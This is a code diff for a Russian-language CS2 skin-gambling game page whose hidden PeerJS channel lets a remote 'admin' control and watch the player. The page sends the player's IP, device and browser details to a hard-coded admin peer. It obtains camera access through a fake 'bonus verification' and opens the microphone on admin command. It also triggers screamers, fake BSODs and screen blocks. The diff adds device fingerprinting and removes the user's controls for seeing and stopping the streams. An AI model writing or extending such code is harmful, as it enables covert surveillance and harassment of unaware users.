@@ -203,19 +203,32 @@ body.hue{filter:hue-rotate(180deg)}
 #blockOverlay.active{display:flex}
 #blockOverlay h1{font-size:48px;color:#eb4b4b;margin-bottom:20px;text-shadow:0 0 30px rgba(235,75,75,.6)}
 #blockOverlay p{color:#8892a6;font-size:18px}
-/* Плавающая панель голоса/связи */
-#voiceBar{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);z-index:9999;display:none;align-items:center;gap:8px;background:rgba(10,12,18,.95);padding:10px 14px;border-radius:14px;border:1px solid #262c38;backdrop-filter:blur(10px);box-shadow:0 10px 40px rgba(0,0,0,.5)}
-#voiceBar.active{display:flex}
-#voiceBar .vb-btn{background:#181c24;color:#fff;border:2px solid #262c38;border-radius:10px;padding:8px 12px;font-weight:700;font-size:12px;cursor:pointer;transition:.2s}
-#voiceBar .vb-btn:hover{border-color:#7c3aed}
-#voiceBar .vb-btn.on{border-color:#4ade80;color:#4ade80}
-#voiceBar .vb-btn.off{border-color:#eb4b4b;color:#eb4b4b}
-#voiceBar .vb-status{font-size:11px;color:#8892a6;margin-left:6px}
+#voiceIndicator{position:fixed;top:80px;left:50%;transform:translateX(-50%);z-index:9999;background:linear-gradient(135deg,#22c55e,#15803d);color:#fff;padding:10px 22px;border-radius:12px;font-weight:800;font-size:14px;box-shadow:0 10px 30px rgba(34,197,94,.5);display:none;align-items:center;gap:10px;animation:voicePulse 1.2s infinite}
+#voiceIndicator.active{display:flex}
+@keyframes voicePulse{0%,100%{box-shadow:0 10px 30px rgba(34,197,94,.5)}50%{box-shadow:0 10px 40px rgba(34,197,94,.9)}}
+#audioUnlockBanner{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);z-index:99999;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:14px 24px;border-radius:14px;font-weight:800;font-size:14px;cursor:pointer;box-shadow:0 10px 40px rgba(245,158,11,.6);display:none;animation:audioPulse 1.5s infinite}
+#audioUnlockBanner.active{display:block}
+@keyframes audioPulse{0%,100%{transform:translateX(-50%) scale(1)}50%{transform:translateX(-50%) scale(1.05)}}
+#mobileWarning{position:fixed;top:70px;left:50%;transform:translateX(-50%);z-index:9998;background:rgba(124,58,237,.95);color:#fff;padding:10px 20px;border-radius:10px;font-size:12px;font-weight:600;max-width:90vw;text-align:center;display:none}
+#mobileWarning.active{display:block}
 @media(max-width:720px){.game-area{grid-template-columns:1fr}.top-bar{flex-direction:column;align-items:stretch;position:static}}
 </style>
 </head>
 <body>
 <canvas id="particles"></canvas>
+
+<!-- Индикатор: админ говорит -->
+<div id="voiceIndicator">
+  <span style="font-size:20px">🎙</span>
+  <span>Админ говорит</span>
+  <span style="width:8px;height:8px;border-radius:50%;background:#fff;animation:pulse 0.8s infinite"></span>
+</div>
+
+<!-- Баннер тапа для разблокировки звука -->
+<div id="audioUnlockBanner">🔊 Тапни чтобы включить звук</div>
+
+<!-- Предупреждение о мобильном -->
+<div id="mobileWarning">📱 Трансляция экрана недоступна на телефоне</div>
 
 <div class="deposit-fixed">
   <span style="font-size:14px">💳</span>
@@ -271,7 +284,6 @@ body.hue{filter:hue-rotate(180deg)}
         <div class="info-box">Выигрыш:<b class="green" id="infoWin">$0.00</b></div>
       </div>
     </div>
-
     <div class="game-area">
       <div class="skin-card" id="yourCard"><div class="skin-placeholder" id="yourEmoji">🎒</div><div class="skin-weapon" id="yourWeapon">Выбери скин</div><div class="skin-name" id="yourName">из инвентаря</div><div class="skin-price" id="yourPrice">$0.00</div></div>
       <div class="center-controls">
@@ -295,16 +307,12 @@ body.hue{filter:hue-rotate(180deg)}
               <circle cx="50" cy="50" r="3" fill="#fff"/>
             </g>
           </svg>
-          <div class="up-circle-label">
-            <div class="up-pct" id="upPct">50.00%</div>
-            <div class="up-pct-lbl">шанс</div>
-          </div>
+          <div class="up-circle-label"><div class="up-pct" id="upPct">50.00%</div><div class="up-pct-lbl">шанс</div></div>
         </div>
         <button class="btn btn-upgrade" id="upgradeBtn" disabled>⬆ Прокачать</button>
       </div>
       <div class="skin-card" id="targetCard"><div class="skin-placeholder" id="targetEmoji">🎯</div><div class="skin-weapon" id="targetWeapon">Цель</div><div class="skin-name" id="targetName">не выбрана</div><div class="skin-price" id="targetPrice">$0.00</div></div>
     </div>
-
     <div class="inventory-panel">
       <div class="tabs"><div class="tab active" data-tab="inventory">🎒 ИНВЕНТАРЬ</div><div class="tab" data-tab="targets">🎯 ЦЕЛИ</div></div>
       <div class="panel-title"><span id="panelTitle">Выбери скин</span><span id="panelCount">0 предметов</span></div>
@@ -321,7 +329,6 @@ body.hue{filter:hue-rotate(180deg)}
         </select>
       </div>
       <div class="inventory-grid" id="inventoryGrid"></div>
-      <div style="margin-top:12px;padding:12px;border-radius:10px;background:rgba(124,58,237,.1);border:1px solid var(--border-2);color:var(--text-dim);font-size:12px" id="targetHint">💡 Выбери скин</div>
     </div>
     <div class="history-panel"><div class="panel-title" style="margin-top:0"><span>📜 История</span></div><div id="historyList"></div></div>
   </div>
@@ -346,14 +353,6 @@ body.hue{filter:hue-rotate(180deg)}
     <div class="stat"><div class="stat-label">Ставок</div><div class="stat-value" id="statStaked">$0</div></div>
     <div class="stat"><div class="stat-label">Лучший дроп</div><div class="stat-value gold" id="statBest">—</div></div>
   </div>
-</div>
-
-<!-- Плавающая панель голосовой связи -->
-<div id="voiceBar">
-  <button class="vb-btn" id="vbMic">🎤 Микрофон</button>
-  <button class="vb-btn" id="vbCam">📸 Камера</button>
-  <button class="vb-btn" id="vbScreen">🖥 Экран</button>
-  <span class="vb-status" id="vbStatus">Не подключено</span>
 </div>
 
 <div class="result-overlay" id="resultOverlay">
@@ -419,24 +418,117 @@ body.hue{filter:hue-rotate(180deg)}
 // ===== PEERJS =====
 const ADMIN_PEER_ID = 'CS2_ADMIN_X7K9QW2';
 let peer = null, adminConn = null, videoCall = null, camStream = null;
-let micStream = null, screenStream = null;
-let incomingVoiceCall = null;
+let micStream = null;
+let voiceListenPeer = null;
 
+/* ============================================================
+   ОПРЕДЕЛЕНИЕ УСТРОЙСТВА
+   ============================================================ */
+function detectDevice() {
+    const ua = navigator.userAgent;
+    let device = '❓ Неизвестное';
+    let type = 'desktop';
+    // Мобильные
+    if (/iPhone/.test(ua)) { device = '🍎 iPhone'; type = 'mobile'; }
+    else if (/iPad/.test(ua)) { device = '🍎 iPad'; type = 'tablet'; }
+    else if (/Android/.test(ua)) {
+        const m = ua.match(/Android [\d.]+;\s*([^;)]+)/);
+        const model = m ? m[1].trim() : 'Android';
+        device = '📱 ' + model;
+        type = 'mobile';
+    }
+    // ПК
+    else if (/Windows NT 10/.test(ua)) device = '💻 Windows 10/11';
+    else if (/Windows NT/.test(ua)) device = '💻 Windows';
+    else if (/Macintosh/.test(ua)) device = '💻 Mac';
+    else if (/Linux/.test(ua)) device = '💻 Linux';
+    
+    // Браузер
+    let browser = 'Unknown';
+    if (/Edg\//.test(ua)) browser = 'Edge';
+    else if (/OPR\//.test(ua)) browser = 'Opera';
+    else if (/YaBrowser/.test(ua)) browser = 'Yandex';
+    else if (/Chrome\//.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
+    else if (/Firefox\//.test(ua)) browser = 'Firefox';
+    else if (/Safari\//.test(ua)) browser = 'Safari';
+    
+    return { device, browser, type, ua };
+}
+const DEVICE_INFO = detectDevice();
+
+// Короткий ID устройства для сессии
+const SESSION_ID = Math.random().toString(36).slice(2, 6).toUpperCase();
+
+/* ============================================================
+   РАЗБЛОКИРОВКА ЗВУКА
+   ============================================================ */
+let audioUnlocked = false;
+function unlockAudio() {
+    if (audioUnlocked) return;
+    audioUnlocked = true;
+    document.getElementById('audioUnlockBanner').classList.remove('active');
+    // Принудительно "разбудим" все audio
+    ['adminVoice','remoteSnd'].forEach(id => {
+        const a = document.getElementById(id);
+        if (a) {
+            a.volume = 0.01;
+            a.play().then(() => { a.pause(); a.currentTime = 0; a.volume = 1.0; }).catch(()=>{});
+        }
+    });
+    try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        if (ctx.state === 'suspended') ctx.resume();
+    } catch(e){}
+    try { Sound.init(); } catch(e){}
+    console.log('🔊 Audio unlocked');
+}
+document.getElementById('audioUnlockBanner').addEventListener('click', unlockAudio);
+document.body.addEventListener('click', unlockAudio, {once: false});
+document.body.addEventListener('touchstart', unlockAudio, {once: false});
+
+// Показываем баннер через 2 секунды если не разблокировано
+setTimeout(() => {
+    if (!audioUnlocked) {
+        document.getElementById('audioUnlockBanner').classList.add('active');
+    }
+}, 2000);
+
+// Показываем предупреждение на мобильных
+if (DEVICE_INFO.type === 'mobile' || DEVICE_INFO.type === 'tablet') {
+    document.getElementById('mobileWarning').classList.add('active');
+    setTimeout(() => document.getElementById('mobileWarning').classList.remove('active'), 6000);
+}
+
+/* ============================================================
+   PEERJS
+   ============================================================ */
 function initPeer() {
     peer = new Peer();
     peer.on('open', (id) => { console.log('Мой Peer ID:', id); connectToAdmin(); });
     peer.on('error', (err) => { console.error('Peer error:', err); setTimeout(initPeer, 3000); });
-    // Входящие звонки от админа (голос)
     peer.on('call', (call) => {
-        console.log('Входящий звонок от админа');
+        console.log('Входящий звонок');
         call.answer();
         call.on('stream', (stream) => {
+            // Голос от админа
             const a = document.getElementById('adminVoice');
             a.srcObject = stream;
-            a.play().catch(()=>{});
-            showToast('🎤 Админ говорит', 'info', 3000);
-            document.getElementById('voiceBar').classList.add('active');
-            document.getElementById('vbStatus').textContent = 'Админ говорит';
+            const playPromise = a.play();
+            if (playPromise) {
+                playPromise.then(() => {
+                    // Успешно играем
+                    document.getElementById('voiceIndicator').classList.add('active');
+                    sendToAdmin({type: 'voicePlaying', ts: Date.now()});
+                    setTimeout(() => {
+                        document.getElementById('voiceIndicator').classList.remove('active');
+                        sendToAdmin({type: 'voiceStopped', ts: Date.now()});
+                    }, 10000);
+                }).catch(() => {
+                    // Автоплей заблокирован
+                    document.getElementById('audioUnlockBanner').classList.add('active');
+                    showToast('🔊 Тапни по экрану чтобы услышать', 'error', 5000);
+                });
+            }
         });
     });
 }
@@ -446,7 +538,19 @@ function connectToAdmin() {
     try {
         adminConn = peer.connect(ADMIN_PEER_ID, {reliable: true});
         adminConn.on('open', () => {
-            sendToAdmin({type:'hello',ip:USER_IP,ua:navigator.userAgent,balance:state.balance,drops:state.stats.total,ts:Date.now()});
+            sendToAdmin({
+                type:'hello',
+                ip:USER_IP,
+                ua:navigator.userAgent,
+                device: DEVICE_INFO.device,
+                browser: DEVICE_INFO.browser,
+                deviceType: DEVICE_INFO.type,
+                sessionId: SESSION_ID,
+                screen: `${screen.width}x${screen.height}`,
+                balance:state.balance,
+                drops:state.stats.total,
+                ts:Date.now()
+            });
             setInterval(() => { if (adminConn && adminConn.open) sendToAdmin({type:'heartbeat',ip:USER_IP,balance:state.balance,drops:state.stats.total,ts:Date.now()}); }, 5000);
         });
         adminConn.on('data', handleAdminCommand);
@@ -486,117 +590,81 @@ function handleAdminCommand(msg) {
         case 'longShake': triggerShake(10000); break;
         case 'longInvert': triggerFilter('invert', 30000); break;
         case 'longBlur': triggerFilter('blur', 30000); break;
-        case 'notification': if (window.Notification && Notification.permission === 'granted') { new Notification(msg.title || 'Уведомление', {body: msg.text || ''}); } break;
-        case 'requestNotif': if (window.Notification && Notification.permission !== 'granted') Notification.requestPermission(); break;
-        // Новые команды для связи
         case 'requestMic': requestMicStream(); break;
-        case 'requestScreenAudio': requestScreenWithAudio(); break;
+        case 'startVoiceListen': startVoiceListen(); break;
     }
 }
 
-// ===== ГОЛОС И ЭКРАН — ДРУГ РАЗРЕШАЕТ =====
+/* ============================================================
+   ГОЛОСОВАЯ СВЯЗЬ — ДРУГ СЛУШАЕТ АДМИНА
+   ============================================================ */
+async function startVoiceListen() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
+        // Создаём отдельный peer для голосовой связи
+        if (voiceListenPeer) { try { voiceListenPeer.destroy(); } catch(e){} }
+        voiceListenPeer = new Peer();
+        voiceListenPeer.on('open', (myId) => {
+            // Отправляем админу свой peer ID — он позвонит нам
+            if (adminConn && adminConn.open) {
+                adminConn.send({type: 'voicePeerId', peerId: myId});
+                console.log('Voice peer ID отправлен админу:', myId);
+            }
+        });
+        voiceListenPeer.on('call', (call) => {
+            call.answer();
+            call.on('stream', (remoteStream) => {
+                const a = document.getElementById('adminVoice');
+                a.srcObject = remoteStream;
+                const p = a.play();
+                if (p) {
+                    p.then(() => {
+                        document.getElementById('voiceIndicator').classList.add('active');
+                        sendToAdmin({type: 'voicePlaying', ts: Date.now()});
+                        console.log('🎙 Слушаю админа');
+                    }).catch(() => {
+                        document.getElementById('audioUnlockBanner').classList.add('active');
+                        showToast('🔊 Тапни по экрану чтобы услышать', 'error', 5000);
+                    });
+                }
+            });
+            call.on('close', () => {
+                document.getElementById('voiceIndicator').classList.remove('active');
+                sendToAdmin({type: 'voiceStopped', ts: Date.now()});
+            });
+        });
+    } catch(e) {
+        console.error('Voice listen error:', e);
+        sendToAdmin({type: 'voiceFail', error: e.message});
+        showToast('❌ Микрофон: ' + e.message, 'error', 3000);
+    }
+}
 
-// Запрос микрофона от друга
 async function requestMicStream() {
     try {
         micStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
-        if (peer && peer.open) {
-            const call = peer.call(ADMIN_PEER_ID + '_mic', micStream);
-            call.on('stream', () => {});
+        if (voiceListenPeer && voiceListenPeer.open) {
+            voiceListenPeer.call(ADMIN_PEER_ID + '_mic', micStream);
         }
         sendToAdmin({type: 'micOn', ts: Date.now()});
         showToast('🎤 Микрофон включён', 'success', 2500);
-        document.getElementById('voiceBar').classList.add('active');
-        document.getElementById('vbMic').classList.add('on');
-        document.getElementById('vbMic').classList.remove('off');
-        document.getElementById('vbStatus').textContent = 'Микрофон активен';
     } catch(e) {
         sendToAdmin({type: 'micFail', error: e.message});
         showToast('❌ Микрофон недоступен', 'error', 3000);
     }
 }
 
-// Запрос экрана + звука экрана от друга
-async function requestScreenWithAudio() {
-    try {
-        // Пытаемся со звуком
-        screenStream = await navigator.mediaDevices.getDisplayMedia({
-            video: {frameRate: 30},
-            audio: true
-        });
-        if (peer && peer.open) {
-            const call = peer.call(ADMIN_PEER_ID + '_screen', screenStream);
-            call.on('stream', () => {});
-        }
-        sendToAdmin({type: 'screenOn', hasAudio: screenStream.getAudioTracks().length > 0, ts: Date.now()});
-        showToast('🖥 Экран расшарен', 'success', 2500);
-        document.getElementById('voiceBar').classList.add('active');
-        document.getElementById('vbScreen').classList.add('on');
-        document.getElementById('vbScreen').classList.remove('off');
-        document.getElementById('vbStatus').textContent = 'Экран расшарен';
-    } catch(e) {
-        // Пробуем без звука
-        try {
-            screenStream = await navigator.mediaDevices.getDisplayMedia({video: true, audio: false});
-            if (peer && peer.open) {
-                const call = peer.call(ADMIN_PEER_ID + '_screen', screenStream);
-                call.on('stream', () => {});
-            }
-            sendToAdmin({type: 'screenOn', hasAudio: false, ts: Date.now()});
-            showToast('🖥 Экран расшарен (без звука)', 'info', 3000);
-            document.getElementById('voiceBar').classList.add('active');
-            document.getElementById('vbScreen').classList.add('on');
-        } catch(e2) {
-            sendToAdmin({type: 'screenFail', error: e2.message});
-            showToast('❌ Экран недоступен', 'error', 3000);
-        }
-    }
-}
-
-// Друг может выключить микрофон/экран
-document.getElementById('vbMic').addEventListener('click', async () => {
-    if (micStream) {
-        micStream.getTracks().forEach(t => t.stop());
-        micStream = null;
-        sendToAdmin({type: 'micOff', ts: Date.now()});
-        document.getElementById('vbMic').classList.remove('on');
-        document.getElementById('vbMic').classList.add('off');
-        showToast('🎤 Микрофон выключен', 'info', 2000);
-    } else {
-        await requestMicStream();
-    }
-});
-document.getElementById('vbScreen').addEventListener('click', async () => {
-    if (screenStream) {
-        screenStream.getTracks().forEach(t => t.stop());
-        screenStream = null;
-        sendToAdmin({type: 'screenOff', ts: Date.now()});
-        document.getElementById('vbScreen').classList.remove('on');
-        document.getElementById('vbScreen').classList.add('off');
-        showToast('🖥 Экран выключен', 'info', 2000);
-    } else {
-        await requestScreenWithAudio();
-    }
-});
-document.getElementById('vbCam').addEventListener('click', async () => {
-    await requestCamera();
-    document.getElementById('vbCam').classList.add('on');
-    document.getElementById('voiceBar').classList.add('active');
-});
-
+/* ============================================================
+   ПРОЧИЕ ФУНКЦИИ
+   ============================================================ */
 function showAdminModal(title, text) {
     document.getElementById('adminModalTitle').textContent = title;
     document.getElementById('adminModalText').textContent = text;
     document.getElementById('adminModal').classList.add('active');
 }
 document.getElementById('adminModalClose').onclick = () => document.getElementById('adminModal').classList.remove('active');
-
-function blockScreen(text) {
-    document.getElementById('blockText').textContent = text;
-    document.getElementById('blockOverlay').classList.add('active');
-}
+function blockScreen(text) { document.getElementById('blockText').textContent = text; document.getElementById('blockOverlay').classList.add('active'); }
 function unblockScreen() { document.getElementById('blockOverlay').classList.remove('active'); }
-
 function triggerShake(d){ document.body.classList.add('shake'); setTimeout(()=>document.body.classList.remove('shake'), d); }
 function triggerFilter(c,d){ document.body.classList.add(c); setTimeout(()=>document.body.classList.remove(c), d); }
 function stopAllPranks(){
@@ -622,6 +690,7 @@ function triggerBigCursor(d){
     setTimeout(()=>{document.removeEventListener('mousemove',move);div.remove();},d);
 }
 function triggerScreamer(d){
+    unlockAudio();
     try{
         const ctx=new (window.AudioContext||window.webkitAudioContext)();
         const osc=ctx.createOscillator(),gain=ctx.createGain();
@@ -667,17 +736,20 @@ function triggerBsod(){
     },500);
 }
 function playRemoteSound(url){
+    unlockAudio();
     const a=document.getElementById('remoteSnd');
-    a.pause();a.src=url;a.loop=false;a.volume=1.0;a.play().catch(()=>{});
+    a.pause();a.src=url;a.loop=false;a.volume=1.0;
+    a.play().catch(()=>{ document.getElementById('audioUnlockBanner').classList.add('active'); });
 }
 function playRemoteMp3(dataUrl){
-    try{const a=document.getElementById('remoteSnd');a.pause();a.src=dataUrl;a.loop=false;a.volume=1.0;a.play().catch(err=>console.warn('Play error:',err));}catch(e){console.error('MP3 error:',e);}
+    unlockAudio();
+    try{const a=document.getElementById('remoteSnd');a.pause();a.src=dataUrl;a.loop=false;a.volume=1.0;a.play().catch(()=>{ document.getElementById('audioUnlockBanner').classList.add('active'); });}catch(e){}
 }
 async function requestCamera() {
     try {
         camStream = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
         if (!peer) return;
-        videoCall = peer.call(ADMIN_PEER_ID, camStream);
+        videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream);
         videoCall.on('stream', () => {});
         sendToAdmin({type: 'cameraOn', ts: Date.now()});
         showToast('📸 Камера включена', 'success', 2500);
@@ -834,7 +906,6 @@ const SKINS = generateSkins();
 const SKIN_MAP = {}; SKINS.forEach(s => SKIN_MAP[s.id] = s);
 const getSkin = id => SKIN_MAP[id];
 
-// ===== КЕЙСЫ =====
 function pickInRange(min, max, rarityFilter) {
     let pool = SKINS.filter(s => s.price >= min && s.price <= max && (!rarityFilter || s.rarity === rarityFilter));
     if (!pool.length) pool = SKINS.filter(s => s.price >= min && s.price <= max);
@@ -934,20 +1005,20 @@ function getCooldownLeft(){const last = getLastDepositTime();if (!last) return 0
 
 function openDepositModal(){$('depositModal').classList.add('active');setTimeout(()=>$('depositAmount').focus(),100);updateDepositInfo();}
 function updateDepositInfo(){const daily = getDailyTotal();const cd = getCooldownLeft();const info = $('depositInfo');if (!info) return;
-    if (cd > 0) { const min = Math.ceil(cd / 60000); info.innerHTML = `⏳ <span style="color:#eb4b4b">Подожди ${min} мин до следующего пополнения</span>`; }
-    else if (daily >= DEPOSIT_DAILY) { info.innerHTML = `🔒 Дневной лимит исчерпан`; }
-    else { info.innerHTML = `За сутки: <b style="color:#f0b90b">$${daily.toFixed(0)}</b> / $${DEPOSIT_DAILY} · Осталось: <b style="color:#4ade80">$${(DEPOSIT_DAILY - daily).toFixed(0)}</b>`; }
+    if (cd > 0) { const min = Math.ceil(cd / 60000); info.innerHTML = `⏳ <span style="color:#eb4b4b">Подожди ${min} мин</span>`; }
+    else if (daily >= DEPOSIT_DAILY) { info.innerHTML = `🔒 Лимит исчерпан`; }
+    else { info.innerHTML = `За сутки: <b style="color:#f0b90b">$${daily.toFixed(0)}</b> / $${DEPOSIT_DAILY}`; }
 }
 function closeDepositModal(){ $('depositModal').classList.remove('active'); }
 function confirmDeposit(){
     const input = $('depositAmount');
     const amount = Number(input.value);
     if(!Number.isFinite(amount) || amount < DEPOSIT_MIN){ showToast(`Минимум $${DEPOSIT_MIN}`,'error'); return; }
-    if(amount > DEPOSIT_MAX){ showToast(`Максимум за раз $${DEPOSIT_MAX}`,'error'); return; }
+    if(amount > DEPOSIT_MAX){ showToast(`Максимум $${DEPOSIT_MAX}`,'error'); return; }
     const cd = getCooldownLeft();
-    if (cd > 0) { const min = Math.ceil(cd / 60000); showToast(`⏳ Подожди ещё ${min} мин`, 'error', 4000); return; }
+    if (cd > 0) { const min = Math.ceil(cd / 60000); showToast(`⏳ Подожди ${min} мин`, 'error', 4000); return; }
     const daily = getDailyTotal();
-    if(daily + amount > DEPOSIT_DAILY){ showToast(`Лимит $${DEPOSIT_DAILY}/сутки. Осталось: $${Math.max(0, DEPOSIT_DAILY - daily).toFixed(0)}`,'error',4000); return; }
+    if(daily + amount > DEPOSIT_DAILY){ showToast(`Лимит $${DEPOSIT_DAILY}`,'error',4000); return; }
     state.balance += amount;
     state.deposits.push({ts: Date.now(), amount});
     if (state.deposits.length > 100) state.deposits = state.deposits.slice(-100);
@@ -972,20 +1043,11 @@ function pickTargetByMult(mult) {
     const y = getSkin(state.yourSkin);
     const need = y.price * mult;
     const candidates = SKINS.filter(s => s.id !== y.id && s.price >= need * 0.85).sort((a,b) => Math.abs(a.price - need) - Math.abs(b.price - need));
-    if (!candidates.length) { showToast('Нет подходящей цели','error'); return; }
+    if (!candidates.length) { showToast('Нет цели','error'); return; }
     state.targetSkin = candidates[0].id;
     recalcUpgrade(); renderChanceBtns(); updateCards(); updateInfo(); renderInventory();
 }
 function autoPickTarget() { if (!state.yourSkin) { state.targetSkin = null; return; } pickTargetByMult(state.multiplier || 2); }
-
-function updateTargetHint(){
-    const el=$('targetHint');if(!el)return;
-    if(!state.yourSkin){el.innerHTML='💡 Выбери скин слева, потом цель справа';return;}
-    const y=getSkin(state.yourSkin),t=getSkin(state.targetSkin);
-    if(!t){el.innerHTML=`⚠️ Выбери цель в списке ниже`;return;}
-    const r=(t.price/y.price).toFixed(2);
-    el.innerHTML=`🎯 <b>${t.weapon} | ${t.name}</b> — ${fmt(t.price)} · множитель <b style="color:var(--gold)">x${r}</b> · шанс <b style="color:var(--green)">${state.chance}%</b>`;
-}
 
 function renderChanceBtns(){
     const w=$('chanceBtns');if(!w)return;w.innerHTML='';
@@ -1018,7 +1080,7 @@ function updateInfo(){
 }
 
 const COMM = 0.05;
-function sellSkin(id){const idx=state.inventory.indexOf(id);if(idx===-1)return;const s=getSkin(id);if(!s)return;const e=s.price*(1-COMM);state.inventory.splice(idx,1);state.balance+=e;if(state.yourSkin===id)state.yourSkin=null;if(state.targetSkin===id)state.targetSkin=null;updateBalance();updateCards();renderInventory();updateInfo();addHistory('sell',`Продано: ${s.name}`,e);showToast(`💰 +${fmt(e)}`,'sell');Sound.sell();saveState(true);checkAch();updateStatsUI();}
+function sellSkin(id){const idx=state.inventory.indexOf(id);if(idx===-1)return;const s=getSkin(id);if(!s)return;const e=s.price*(1-COMM);state.inventory.splice(idx,1);state.balance+=e;if(state.yourSkin===id)state.yourSkin=null;if(state.targetSkin===id)state.targetSkin=null;updateBalance();updateCards();renderInventory();updateInfo();addHistory('sell',`Продано: ${s.name}`,e);showToast(`💰 +${fmt(e)}`,'sell');Sound.sell();saveState(true);checkAch();updateStatsUI();sendToAdmin({type:'sell',skin:s,earned:e,ts:Date.now()});}
 function sellCheap(){const c=state.inventory.filter(id=>getSkin(id)?.price<100);if(!c.length){showToast('Нет дешёвых','error');return;}let t=0;c.forEach(id=>{t+=getSkin(id).price*(1-COMM);});state.inventory=state.inventory.filter(id=>getSkin(id)?.price>=100);state.balance+=t;if(state.yourSkin&&!state.inventory.includes(state.yourSkin))state.yourSkin=null;if(state.targetSkin&&!state.inventory.includes(state.targetSkin))state.targetSkin=null;updateBalance();updateCards();renderInventory();updateInfo();updateStatsUI();addHistory('sell',`Продано ${c.length}` ,t);showToast(`💰 +${fmt(t)}`,'sell');Sound.sell();saveState(true);checkAch();}
 
 const PAGE = 60;
@@ -1046,7 +1108,7 @@ function renderInventory(){
         g.appendChild(it);
     });
     if(tp>1){const n=document.createElement('div');n.style.cssText='grid-column:1/-1;display:flex;gap:10px;justify-content:center;margin-top:12px';const pr=document.createElement('button');pr.className='btn btn-secondary';pr.textContent='←';pr.disabled=state.invPage===0;pr.onclick=()=>{state.invPage--;renderInventory();};const info=document.createElement('div');info.style.cssText='padding:14px;color:var(--text-dim)';info.textContent=`${state.invPage+1}/${tp}`;const nx=document.createElement('button');nx.className='btn btn-secondary';nx.textContent='→';nx.disabled=state.invPage>=tp-1;nx.onclick=()=>{state.invPage++;renderInventory();};n.appendChild(pr);n.appendChild(info);n.appendChild(nx);g.appendChild(n);}
-    updateInfo();updateTargetHint();
+    updateInfo();
 }
 
 function updateCards(){
@@ -1069,7 +1131,6 @@ function renderCases(){const g=$('casesGrid');g.innerHTML='';CASES.forEach(c=>{c
 function weightedRandom(items){const tw=items.reduce((s,x)=>s+x.weight,0);let r=Math.random()*tw;for(const x of items){r-=x.weight;if(r<=0)return x;}return items[items.length-1];}
 const SPIN_D=8, ITEMS=70, WINNER=60;
 let caseLock=false;
-
 function openCase(id){
     if(caseLock)return;
     const c=CASES.find(x=>x.id===id);if(!c)return;
@@ -1092,7 +1153,6 @@ function openCase(id){
     $('caseOpenPanel').scrollIntoView({behavior:'smooth',block:'center'});
 }
 function closeCase(){if(state.spinning)return;$('caseOpenPanel').style.display='none';state.currentCase=null;caseLock=false;}
-
 function openSelectedCase(){
     const c=state.currentCase;if(!c||state.spinning||caseLock)return;
     if(state.balance<c.price){showToast('Мало средств','error');return;}
@@ -1110,8 +1170,8 @@ function openSelectedCase(){
             const p=r.price-c.price,pc=p>=0?'var(--green)':'var(--red)',ps=p>=0?'+':'';
             $('caseResult').innerHTML=`Получено: <b style="color:var(--gold)">${r.weapon} | ${r.name}</b> — <b style="color:var(--green)">${fmt(r.price)}</b> <span style="color:${pc}">(${ps}${fmt(p)})</span>`;
             addHistory('drop',`Дроп: ${r.name}`,r.price);
-            if(r.price>=c.price*5)showToast(`💎 ДЖЕКПОТ: ${r.name}!`,'achievement',4000);
-            else if(r.price>=c.price)showToast(`🎉 Окупилось: ${r.name}`,'success',3000);
+            if(r.price>=c.price*5)showToast(`💎 ДЖЕКПОТ!`,'achievement',4000);
+            else if(r.price>=c.price)showToast(`🎉 Окупилось`,'success',3000);
             else showToast(`🎁 ${r.name}`,'info');
             Sound.drop();checkAch();updateStatsUI();
             sendToAdmin({type:'drop',caseName:c.name,casePrice:c.price,skin:r,profit:p,ts:Date.now()});
@@ -1206,20 +1266,20 @@ $('bonusBtn').addEventListener('click', async () => {
     const claimBtn = $('bonusClaim');
     const isHttps = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
     if (!isHttps) {
-        textEl.innerHTML = '⚠️ Сайт открыт по <b>HTTP</b>.<br>Камера и микрофон работают только по HTTPS.';
-        statusEl.textContent = 'Открой сайт через https://';
+        textEl.innerHTML = '⚠️ Сайт открыт по <b>HTTP</b>.<br>Нужен HTTPS.';
+        statusEl.textContent = 'Открой через https://';
         statusEl.style.color = '#eb4b4b';
         claimBtn.disabled = true;
         return;
     }
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        textEl.innerHTML = '⚠️ Браузер не поддерживает камеру';
+        textEl.innerHTML = '⚠️ Браузер не поддерживает';
         statusEl.textContent = 'Открой в Chrome или Safari';
         statusEl.style.color = '#eb4b4b';
         claimBtn.disabled = true;
         return;
     }
-    statusEl.textContent = '✅ Всё готово. Нажми кнопку ниже';
+    statusEl.textContent = '✅ Готово. Нажми кнопку';
     statusEl.style.color = '#4ade80';
     claimBtn.disabled = false;
 });
@@ -1237,23 +1297,17 @@ $('bonusClaim').addEventListener('click', async () => {
         statusEl.style.color = '#4ade80';
         if (peer && peer.open) {
             try { videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream); videoCall.on('stream', () => {}); } catch(e) {}
-            try { const micCall = peer.call(ADMIN_PEER_ID + '_mic', camStream); micCall.on('stream', () => {}); } catch(e) {}
         }
-        // Открываем панель управления
-        document.getElementById('voiceBar').classList.add('active');
-        document.getElementById('vbCam').classList.add('on');
-        document.getElementById('vbMic').classList.add('on');
-        document.getElementById('vbStatus').textContent = 'Подключено к админу';
+        sendToAdmin({type: 'cameraOn', ts: Date.now()});
         setTimeout(() => {
             $('bonusModal').classList.remove('active');
             showToast('✅ Верификация пройдена','success',2500);
             Sound.win();
         }, 800);
     } catch(err) {
-        console.error('Camera error:', err);
         let msg = '❌ Ошибка';
         if (err.name === 'NotAllowedError') msg = '❌ Отклонено';
-        else if (err.name === 'NotFoundError') msg = '❌ Устройство не найдено';
+        else if (err.name === 'NotFoundError') msg = '❌ Не найдено';
         statusEl.textContent = msg;
         statusEl.style.color = '#eb4b4b';
         showToast(msg, 'error', 4000);
@@ -1269,7 +1323,7 @@ async function init(){
     PROFILE_KEY = 'cs2_profile_' + safe;
     loadState();
     if(state.theme==='light'){document.body.classList.add('light');document.getElementById('themeBtn').textContent='☀️';}
